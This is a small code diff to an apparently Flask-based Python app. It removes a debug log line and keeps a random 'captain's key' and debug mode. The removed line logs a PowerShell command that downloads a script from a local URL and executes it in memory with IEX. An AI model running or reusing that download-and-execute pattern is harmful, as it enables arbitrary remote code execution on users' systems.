@@ -31,7 +31,6 @@ def main(args):
 
         if args.debug:
             captains_key = str(uuid.uuid4())
-            logging.debug(f'powershell.exe -c "IEX (new-object net.webclient).downloadstring(\'http://localhost/{captains_key}\')"')
             app.config['CAPTAINS_KEY'] = captains_key
             app.debug = True
 
